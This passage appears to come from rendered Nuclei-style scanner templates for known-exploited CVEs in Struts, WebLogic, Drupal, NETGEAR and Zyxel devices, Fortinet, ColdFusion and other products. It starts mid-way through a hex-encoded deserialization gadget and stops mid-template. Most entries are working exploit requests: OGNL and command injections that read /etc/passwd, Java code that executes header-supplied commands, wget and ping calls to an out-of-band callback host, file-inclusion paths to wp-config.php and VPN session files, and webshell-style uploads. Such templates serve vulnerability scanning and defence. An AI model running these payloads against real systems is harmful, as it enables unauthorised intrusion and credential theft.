6966657261792E706F7274616C2E736572766963652E53657276696365436F6E746578745468726561644C6F63616C2E67657453657276696365436F6E7465787428293B0A76617220697357696E203D206A6176612E6C616E672E53797374656D2E67657450726F706572747928226F732E6E616D6522292E746F4C6F7765724361736528292E636F6E7461696E73282277696E22293B0A7661722072657175657374203D2063757272656E745468726561642E6765745265717565737428293B0A766172205F726571203D206F72672E6170616368652E636174616C696E612E636F6E6E6563746F722E526571756573744661636164652E636C6173732E6765744465636C617265644669656C6428227265717565737422293B0A5F7265712E73657441636365737369626C652874727565293B0A766172207265616C52657175657374203D205F7265712E6765742872657175657374293B0A76617220726573706F6E7365203D207265616C526571756573742E676574526573706F6E736528293B0A766172206F757470757453747265616D203D20726573706F6E73652E6765744F757470757453747265616D28293B0A76617220636D64203D206E6577206A6176612E6C616E672E537472696E6728726571756573742E6765744865616465722822636D64322229293B0A766172206C697374436D64203D206E6577206A6176612E7574696C2E41727261794C69737428293B0A7661722070203D206E6577206A6176612E6C616E672E50726F636573734275696C64657228293B0A696628697357696E297B0A20202020702E636F6D6D616E642822636D642E657865222C20222F63222C20636D64293B0A7D656C73657B0A20202020702E636F6D6D616E64282262617368222C20222D63222C20636D64293B0A7D0A702E72656469726563744572726F7253747265616D2874727565293B0A7661722070726F63657373203D20702E737461727428293B0A76617220696E70757453747265616D526561646572203D206E6577206A6176612E696F2E496E70757453747265616D5265616465722870726F636573732E676574496E70757453747265616D2829293B0A766172206275666665726564526561646572203D206E6577206A6176612E696F2E427566666572656452656164657228696E70757453747265616D526561646572293B0A766172206C696E65203D2022223B0A7661722066756C6C54657874203D2022223B0A7768696C6528286C696E65203D2062756666657265645265616465722E726561644C696E6528292920213D206E756C6C297B0A2020202066756C6C54657874203D2066756C6C54657874202B206C696E65202B20225C6E223B0A7D0A766172206279746573203D2066756C6C546578742E676574427974657328225554462D3822293B0A6F757470757453747265616D2E7772697465286279746573293B0A6F757470757453747265616D2E636C6F736528293B0A7400046576616C7571007E001B0000000171007E00237371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878%3B%22%7D

```

### Matchers

**Type - regex**

- condition - or
- regex
  1. OS Name:.\*Microsoft Windows
  2. Distributor ID:

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- part - body
- regex
  1. Microsoft Windows (.\*)
  2. Distributor ID: (.\*)

**Payloads**- command

---

# Apache Struts 2.0.0-2.5.25 - Remote Code Execution

## Description

- Apache Struts 2.0.0 through Struts 2.5.25 is susceptible to remote code execution because forced OGNL evaluation, when evaluated on raw user input in tag attributes, may allow it.
- severity - critical
- tags - cve,cve2020,apache,rce,struts,kev,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/?id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23arglist%3D%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22cat+%2Fetc%2Fpasswd%22%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7D

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# UnRaid \<=6.80 - Remote Code Execution

## Description

- UnRaid \<=6.80 allows remote unauthenticated attackers to execute arbitrary code.
- severity - critical
- tags - cve,cve2020,rce,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/webGui/images/green-on.png/?path=x&site[x][text]=%3C?php%20phpinfo();%20?%3E

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. PHP Extension
  2. PHP Version
- condition - and

---

# Oracle Fusion - Directory Traversal/Local File Inclusion

## Description

- Oracle Business Intelligence Enterprise Edition 5.5.0.0.0, 12.2.1.3.0, and 12.2.1.4.0 are vulnerable to local file inclusion vulnerabilities via "getPreviewImage."
- severity - high
- tags - cve,cve2020,oracle,lfi,kev,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/analytics/saw.dll?bieehome&startPage=1
- {{BaseURL}}/analytics/saw.dll?getPreviewImage&previewFilePath=/etc/passwd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# Oracle WebLogic Server - Remote Command Execution

## Description

- Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised machine without entering necessary credentials. See also CVE-2020-14882, which is addressed in the October 2020 Critical Patch Update.

- severity - critical
- tags - cve,cve2020,rce,oracle,weblogic,unauth,kev

## Requests

### Step - 1

```
@timeout: 10s
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: {{Hostname}}
User-Agent: curl/7.79.1
Accept: */*
cmd: curl {{interactsh-url}}
Content-Type: application/x-www-form-urlencoded

_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();
weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();
java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
field.setAccessible(true);
Object obj = field.get(adapter);
weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);
String cmd = req.getHeader("cmd");
String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
if (cmd != null) {
    String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
    weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);
    res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
    res.getServletOutputStream().flush();
    res.getWriter().write("");
}executeThread.interrupt();
");

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - word**

- part - header
- words
  1. ADMINCONSOLESESSION=

**Type - regex**

- part - body
- regex
  1. \<html>\<head>\</head>\<body>(.\*)\</body>\</html>

---

# Oracle Weblogic Server - Remote Command Execution

## Description

- Oracle WebLogic Server contains an easily exploitable remote command execution vulnerability which allows unauthenticated attackers with network access via HTTP to compromise the server.
- severity - critical
- tags - cve,cve2020,oracle,rce,weblogic,oast,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/console/images/%252e%252e%252fconsole.portal?\_nfpb=true&\_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext('http://{{interactsh-url}}')

### Matchers

**Type - word**

- part - header
- words
  1. ADMINCONSOLESESSION

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# WordPress Duplicator 1.3.24 & 1.3.26 - Local File Inclusion

## Description

- WordPress Duplicator 1.3.24 & 1.3.26 are vulnerable to local file inclusion vulnerabilities that could allow attackers to download arbitrary files, such as the wp-config.php file. According to the vendor, the vulnerability was only in two
  versions v1.3.24 and v1.3.26, the vulnerability wasn't
  present in versions 1.3.22 and before.

- severity - high
- tags - kev,tenable,packetstorm,cve,cve2020,wordpress,wp-plugin,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
- {{BaseURL}}/wp-admin/admin-ajax.php?action=duplicator_download&file=%2F..%2Fwp-config.php

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. File Transfer
  2. application/octet-stream
  3. attachment; filename="(wp-config\.php|passwd)"
- condition - and
- part - header

**Type - regex**

- regex
  1. root:.\*:0:0:
  2. define\('DB\_(NAME|USER|PASSWORD|HOST|CHARSET|COLLATE)'
- condition - or
- part - body

---

# WordPress File Manager Plugin - Remote Code Execution

## Description

- The WordPress File Manager plugin prior to version 6.9 is susceptible to remote code execution. The vulnerability allows unauthenticated remote attackers to upload .php files.
- severity - critical
- tags - cve,cve2020,wordpress,rce,kev,fileupload,intrusive

## Requests

### Step - 1

```
POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: multipart/form-data; boundary=------------------------ca81ac1fececda48

--------------------------ca81ac1fececda48
Content-Disposition: form-data; name="reqid"

17457a1fe6959
--------------------------ca81ac1fececda48
Content-Disposition: form-data; name="cmd"

upload
--------------------------ca81ac1fececda48
Content-Disposition: form-data; name="target"

l1_Lw
--------------------------ca81ac1fececda48
Content-Disposition: form-data; name="mtime[]"

1576045135
--------------------------ca81ac1fececda48
Content-Disposition: form-data; name="upload[]"; filename="poc.txt"
Content-Type: text/plain

poc-test
--------------------------ca81ac1fececda48--

```

### Matchers

**Type - word**

- words
  1. poc.txt
  2. added
- condition - and

**Type - word**

- words
  1. application/json
- part - header

**Type - status**

- status
  1. 200

---

# NETGEAR ProSAFE Plus - Unauthenticated Remote Code Execution

## Description

- NETGEAR ProSAFE Plus before 2.6.0.43 is susceptible to unauthenticated remote code execution. Any HTML page is allowed as a valid endpoint to submit POST requests, allowing debug action via the submitId and debugCmd parameters. The problem is publicly exposed in the login.html webpage, which has to be publicly available to perform login requests but does not implement any restriction for executing debug actions. This will allow attackers to execute system commands.
- severity - critical
- tags - cve,cve2020,netgear,rce,oast,router,unauth,kev

## Requests

### Step - 1

```
POST /login.htm HTTP/1.1
Host: {{Hostname}}
Accept: */*

submitId=debug&debugCmd=wget+http://{{interactsh-url}}&submitEnd=

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# Zyxel NAS Firmware 5.21- Remote Code Execution

## Description

- Multiple Zyxel network-attached storage (NAS) devices running firmware version 5.21 contain a pre-authentication command injection vulnerability, which may allow a remote, unauthenticated attacker to execute arbitrary code on a vulnerable device. Zyxel NAS devices achieve authentication by using the weblogin.cgi CGI executable. This program fails to properly sanitize the username parameter that is passed to it. If the username parameter contains certain characters, it can allow command injection with the privileges of the web server that runs on the Zyxel device. Although the web server does not run as the root user, Zyyxel devices include a setuid utility that can be leveraged to run any command with root privileges. As such, it should be assumed that exploitation of this vulnerability can lead to remote code execution with root privileges. By sending a specially-crafted HTTP POST or GET request to a vulnerable Zyyxel device, a remote, unauthenticated attacker may be able to execute arbitrary code on the device. This may happen by directly connecting to a device if it is directly exposed to an attacker. However, there are ways to trigger such crafted requests even if an attacker does not have direct connectivity to a vulnerable devices. For example, simply visiting a website can result in the compromise of any Zyyxel device that is reachable from the client system. Affected products include: NAS326 before firmware V5.21(AAZF.7)C0 NAS520 before firmware V5.21(AASZ.3)C0 NAS540 before firmware V5.21(AATB.4)C0 NAS542 before firmware V5.21(ABAG.4)C0 Zyyxel has made firmware updates available for NAS326, NAS520, NAS540, and NAS542 devices. Affected models that are end-of-support: NSA210, NSA220, NSA220+, NSA221, NSA310, NSA310S, NSA320, NSA320S, NSA325 and NSA325v2.
- severity - critical
- tags - cve,cve2020,rce,zyxel,injection,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/cgi-bin/weblogin.cgi?username=admin';cat /etc/passwd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:

---

# NETGEAR Routers - Remote Code Execution

## Description

- NETGEAR routers R6250 before 1.0.4.6.Beta, R6400 before 1.0.1.18.Beta, R6700 before 1.0.1.14.Beta, R6900, R7000 before 1.0.7.6.Beta, R7100LG before 1.0.0.28.Beta, R7300DST before 1.0.0.46.Beta, R7900 before 1.0.1.8.Beta, R8000 before 1.0.3.26.Beta, D6220, D6400, D7000, and possibly others allow remote attackers to execute arbitrary commands via shell metacharacters in the path info to cgi-bin/.
- severity - high
- tags - cve,cve2016,netgear,rce,iot,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/cgi-bin/;cat$IFS/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Apache ActiveMQ Fileserver - Arbitrary File Write

## Description

- Apache ActiveMQ 5.x before 5.14.0 allows remote attackers to upload and execute arbitrary files via an HTTP PUT followed by an HTTP MOVE request via the Fileserver web application.
- severity - critical
- tags - fileupload,kev,edb,cve,cve2016,apache,activemq,intrusive

## Requests

### Step - 1

```
PUT /fileserver/test.txt HTTP/1.1
Host: {{Hostname}}

{{randstr}}

```

### Step - 2

```
GET /fileserver/test.txt HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. status_code_1==204
  2. status_code_2==200
  3. contains((body_2), '{{randstr}}')
- condition - and

---

# NETGEAR WNAP320 Access Point Firmware - Remote Command Injection

## Description

- NETGEAR WNAP320 Access Point Firmware version 2.0.3 could allow an unauthenticated, remote attacker to perform command injection attacks against an affected device.
- severity - critical
- tags - netgear,rce,oast,router,kev,seclists,cve,cve2016

## Requests

### Step - 1

```
POST /boardDataWW.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/x-www-form-urlencoded

macAddress=112233445566%3Bwget+http%3A%2F%2F{{interactsh-url}}%23&reginfo=0&writeData=Submit

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# Adobe ColdFusion - Unrestricted File Upload Remote Code Execution

## Description

- Adobe ColdFusion versions July 12 release (2018.0.0.310739), Update 6 and earlier, and Update 14 and earlier have an unrestricted file upload vulnerability. Successful exploitation could lead to arbitrary code execution.
- severity - critical
- tags - cve,cve2018,adobe,rce,coldfusion,fileupload,kev,intrusive

## Requests

### Step - 1

```
POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=---------------------------24464570528145

-----------------------------24464570528145
Content-Disposition: form-data; name="file"; filename="{{randstr}}.jsp"
Content-Type: image/jpeg

<%@ page import="java.util.*,java.io.*"%>
<%@ page import="java.security.MessageDigest"%>
<%
String cve = "CVE-2018-15961";
MessageDigest alg = MessageDigest.getInstance("MD5");
alg.reset();
alg.update(cve.getBytes());
byte[] digest = alg.digest();
StringBuffer hashedpasswd = new StringBuffer();
String hx;
for (int i=0;i<digest.length;i++){
  hx =  Integer.toHexString(0xFF & digest[i]);
  if(hx.length() == 1){hx = "0" + hx;}
  hashedpasswd.append(hx);
}
out.println(hashedpasswd.toString());
%>
-----------------------------24464570528145
Content-Disposition: form-data; name="path"

{{randstr}}.jsp
-----------------------------24464570528145--

```

### Step - 2

```
GET /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/{{randstr}}.jsp HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- words
  1. ddbb3e76f92e78c445c8ecb392beb225

**Type - status**

- status
  1. 200

---

# Oracle WebLogic Server Deserialization - Remote Code Execution

## Description

- The Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: Web Services) versions 10.3.6.0, 12.1.3.0, 12.2.1.2 and 12.2.1.3 contains an easily exploitable vulnerability that allows unauthenticated attackers with network access via T3 to compromise Oracle WebLogic Server.

- severity - critical
- tags - cve,cve2018,oracle,weblogic,network,deserialization,kev

---

# Drupal - Remote Code Execution

## Description

- Drupal 7.x and 8.x contain a remote code execution vulnerability that exists within multiple subsystems. This potentially allows attackers to exploit multiple attack vectors on a Drupal site, which could result in the site being compromised. This vulnerability is related to Drupal core - Highly critical - Remote Code Execution - SA-CORE-2018-002. Both SA-CORE-2018-002 and this vulnerability are being exploited in the wild.
- severity - critical
- tags - cve2018,drupal,authenticated,kev,cisa,vulhub,edb,cve

## Requests

### Step - 1

```
POST /?q=user%2Flogin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

form_id=user_login&name={{username}}&pass={{password}}&op=Log+in

```

### Step - 2

```
GET /?q={{url_encode("{{userid}}")}}%2Fcancel HTTP/1.1
Host: {{Hostname}}

```

### Step - 3

```
POST /?q={{url_encode("{{userid}}")}}%2Fcancel&destination={{url_encode("{{userid}}")}}%2Fcancel%3Fq%5B%2523post_render%5D%5B%5D%3Dpassthru%26q%5B%2523type%5D%3Dmarkup%26q%5B%2523markup%5D%3Decho+COP-2067-8102-EVC+|+rev HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

form_id=user_cancel_confirm_form&form_token={{form_token}}&_triggering_element_name=form_id&op=Cancel+account

```

### Step - 4

```
POST /?q=file%2Fajax%2Factions%2Fcancel%2F%23options%2Fpath%2F{{form_build_id}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

form_build_id={{form_build_id}}

```

### Matchers

**Type - word**

- words
  1. CVE-2018-7602-POC

### Extractors

**Type - regex**

- part - body
- name - userid
- internal - True
- group - 1
- regex
  1. \<meta about="([/a-z0-9]+)" property="foaf

**Type - regex**

- part - body
- name - form_token
- internal - True
- group - 1
- regex
  1. \<input type="hidden" name="form_token" value="(.\*)" />

**Type - regex**

- part - body
- name - form_build_id
- internal - True
- group - 1
- regex
  1. \<input type="hidden" name="form_build_id" value="(.\*)" />

---

# Dasan GPON Devices - Remote Code Execution

## Description

- Dasan GPON home routers are susceptible to command injection which can occur via the dest_host parameter in a diag_action=ping request to a GponForm/diag_Form URI. Because the router saves ping results in /tmp and transmits them to the user when the user revisits /diag.html, it's quite simple to execute commands and retrieve their output.
- severity - critical
- tags - cve,cve2018,dasan,gpon,rce,oast,kev

## Requests

### Step - 1

```
POST /GponForm/diag_Form?images/ HTTP/1.1
Host: {{Hostname}}

XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox wget http://{{interactsh-url}}`;busybox wget http://{{interactsh-url}}&ipv=0

```

### Step - 2

```
POST /GponForm/diag_Form?images/ HTTP/1.1
Host: {{Hostname}}

XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`wget http://{{interactsh-url}}`;wget http://{{interactsh-url}}&ipv=0

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# Apache Struts2 S2-057 - Remote Code Execution

## Description

- Apache Struts versions 2.3 to 2.3.34 and 2.5 to 2.5.16 suffer from possible remote code execution when alwaysSelectFullNamespace is true (either by user or a plugin like Convention Plugin) and then: results are used with no namespace and in same time, its upper package have no or wildcard namespace and similar to results, same possibility when using url tag which doesn''t have value and action set and in same time, its upper package have no or wildcard namespace.

- severity - high
- tags - cve,cve2018,apache,rce,struts,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/actionChain1.action

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Drupal - Remote Code Execution

## Description

- Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations.
- severity - critical
- tags - cve,cve2018,drupal,rce,kev,cisa,vulhub

## Requests

### Step - 1

```
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host:  {{Hostname}}
Accept: application/json
Referer:  {{Hostname}}/user/register
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------99533888113153068481322586663

-----------------------------99533888113153068481322586663
Content-Disposition: form-data; name="mail[#post_render][]"

passthru
-----------------------------99533888113153068481322586663
Content-Disposition: form-data; name="mail[#type]"

markup
-----------------------------99533888113153068481322586663
Content-Disposition: form-data; name="mail[#markup]"

cat /etc/passwd
-----------------------------99533888113153068481322586663
Content-Disposition: form-data; name="form_id"

user_register_form
-----------------------------99533888113153068481322586663
Content-Disposition: form-data; name="_drupal_ajax"

```

### Matchers

**Type - word**

- words
  1. application/json
- part - header

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

**Type - status**

- status
  1. 200

---

# Spring Data Commons - Remote Code Execution

## Description

- Spring Data Commons, versions prior to 1.13 to 1.13.10, 2.0 to 2.0.5,
  and older unsupported versions, contain a property binder vulnerability
  caused by improper neutralization of special elements.
  An unauthenticated remote malicious user (or attacker) can supply
  specially crafted request parameters against Spring Data REST backed HTTP resources
  or using Spring Data's projection-based request payload binding hat can lead to a remote code execution attack.

- severity - critical
- tags - cve,cve2018,vmware,rce,spring,kev

## Requests

### Step - 1

```
POST /account HTTP/1.1
Host: {{Hostname}}
Connection: close
Content-Type: application/x-www-form-urlencoded

name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('{{url_encode('{{command}}')}}')]=nuclei

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
  2. \[(font|extension|file)s\]
- condition - or
- part - body

**Payloads**- command

---

# Cisco ASA - Local File Inclusion

## Description

- Cisco Adaptive Security Appliances (ASA) web interfaces could allow an unauthenticated, remote attacker to cause an affected device to reload unexpectedly, resulting in a denial of service (DoS) condition. It is also possible on certain software releases that the ASA will not reload, but an attacker could view sensitive system information without authentication by using directory traversal techniques. The vulnerability is due to lack of proper input validation of the HTTP URL. An attacker could exploit this vulnerability by sending a crafted HTTP request to an affected device. An exploit could allow the attacker to cause a DoS condition or unauthenticated disclosure of information. This vulnerability applies to IPv4 and IPv6 HTTP traffic. This vulnerability affects Cisco ASA Software and Cisco Firepower Threat Defense (FTD) Software that is running on the following Cisco products: 3000 Series Industrial Security Appliance (ISA), ASA 1000V Cloud Firewall, ASA 5500 Series Adaptive Security Appliances, ASA 5500-X Series Next-Generation Firewalls, ASA Services Module for Cisco Catalyst 6500 Series Switches and Cisco 7600 Series Routers, Adaptive Security Virtual Appliance (ASAv), Firepower 2100 Series Security Appliance, Firepower 4100 Series Security Appliance, Firepower 9300 ASA Security Module, FTD Virtual (FTDv). Cisco Bug IDs: CSCvi16029.

- severity - high
- tags - edb,cve,cve2018,cisco,lfi,traversal,asa,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions

### Matchers

**Type - word**

- part - body
- words
  1. ///sessions

**Type - status**

- status
  1. 200

---

# Fortinet FortiOS - Credentials Disclosure

## Description

- Fortinet FortiOS 6.0.0 to 6.0.4, 5.6.3 to 5.6.7 and 5.4.6 to 5.4.12 and FortiProxy 2.0.0, 1.2.0 to 1.2.8, 1.1.0 to 1.1.6, 1.0.0 to 1.0.7 under SSL VPN web portal allows an unauthenticated attacker to download system files via special crafted HTTP resource requests due to improper limitation of a pathname to a restricted directory (path traversal).
- severity - critical
- tags - cve,cve2018,fortios,lfi,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession

### Matchers

**Type - regex**

- part - body
- regex
  1. ^var fgt_lang =

---

# Jenkins - Remote Command Injection

## Description

- Jenkins 2.153 and earlier and LTS 2.138.3 and earlier are susceptible to a remote command injection via stapler/core/src/main/java/org/kohsuke/stapler/MetaClass.java that allows attackers to invoke some methods on Java objects by accessing crafted URLs that were not intended to be invoked this way.
- severity - critical
- tags - kev,vulhub,cve,cve2018,rce,jenkins

## Requests

- Method - GET

### URL

- {{BaseURL}}/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vulntest%27,%20version=%271%27)%0aimport%20Payload;

### Matchers

**Type - word**

- words
  1. package#vulntest
- part - body

**Type - status**

- status
  1. 200

---

# Jboss Application Server - Remote Code Execution

## Description

- Jboss Application Server as shipped with Red Hat Enterprise Application Platform 5.2 is susceptible to a remote code execution vulnerability because the doFilter method in the ReadOnlyAccessFilter of the HTTP Invoker does not restrict classes for which it performs deserialization, thus allowing an attacker to execute arbitrary code via crafted serialized data.
- severity - critical
- tags - java,rce,deserialization,kev,vulhub,cve,cve2017,jboss

## Requests

### Step - 1

```
POST /invoker/JMXInvokerServlet/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/octet-stream

{{ base64_decode("rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAACdwQAAAACdAAJZWxlbWVudCAxdAAJZWxlbWVudCAyeA==") }}

```

### Step - 2

```
POST /invoker/EJBInvokerServlet/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/octet-stream

{{ base64_decode("rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAACdwQAAAACdAAJZWxlbWVudCAxdAAJZWxlbWVudCAyeA==") }}

```

### Matchers

**Type - word**

- part - body
- words
  1. ClassCastException

**Type - word**

- part - header
- words
  1. application/x-java-serialized-object

---

# Oracle WebLogic Server - Remote Command Execution

## Description

- The Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent - WLS Security) is susceptible to remote command execution. Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. This easily exploitable vulnerability allows unauthenticated attackers with network access via T3 to compromise Oracle WebLogic Server.

- severity - high
- tags - weblogic,oast,kev,vulhub,cve,cve2017,rce,oracle

## Requests

### Step - 1

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: {{Hostname}}
Accept: */*
Accept-Language: en
Content-Type: text/xml

<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope
    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext
            xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.4.0" class="java.beans.XMLDecoder">
                <void class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>/bin/bash</string>
                        </void>
                        <void index="1">
                            <string>-c</string>
                        </void>
                        <void index="2">
                            <string>ping -c 1 {{interactsh-url}}</string>
                        </void>
                    </array>
                    <void method="start"/></void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>

```

### Step - 2

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: {{Hostname}}
Accept: */*
Accept-Language: en
Content-Type: text/xml

<?xml version="1.0" encoding="utf-8"?>
  <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
          <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java>
                  <void class="java.lang.Thread" method="currentThread">
                      <void method="getCurrentWork">
                          <void method="getResponse">
                              <void method="getServletOutputStream">
                                  <void method="flush"/>
                              </void>
                              <void method="getWriter"><void method="write"><string>{{randstr}}</string></void></void>
                          </void>
                      </void>
                  </void>
              </java>
          </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
</soapenv:Envelope>

```

### Matchers

**Type - dsl**

- dsl
  1. regex("\<faultstring>java.lang.ProcessBuilder || \<faultstring>0", body)
  2. contains(interactsh_protocol, "dns")
  3. status_code == 500
- condition - and

**Type - dsl**

- dsl
  1. body == "{{randstr}}"
  2. status_code == 200
- condition - and

---

# Embedthis GoAhead \<3.6.5 - Remote Code Execution

## Description

- description: Embedthis GoAhead before 3.6.5 allows remote code execution if CGI is enabled and a CGI program is dynamically linked.

- severity - high
- tags - cve,cve2017,rce,goahead,fuzz,kev,vulhub

## Requests

### Step - 1

```
GET /cgi-bin/{{endpoint}}?LD_DEBUG=help HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Matchers

**Type - word**

- words
  1. environment variable
  2. display library search paths
- condition - and

**Type - status**

- status
  1. 200

**Payloads**- endpoint

---

# PHPUnit - Remote Code Execution

## Description

- PHPUnit before 4.8.28 and 5.x before 5.6.3 allows remote attackers to execute arbitrary PHP code via HTTP POST data beginning with a "\<?php " substring via Util/PHP/eval-stdin.php , as demonstrated by an attack on a site with an exposed /vendor folder, i.e., external access to the /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php URI.
- severity - critical
- tags - cve,cve2017,php,phpunit,rce,kev

## Requests

### Step - 1

```
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: {{Hostname}}
Content-Type: text/html

<?php echo md5(phpunit_rce);?>

```

### Step - 2

```
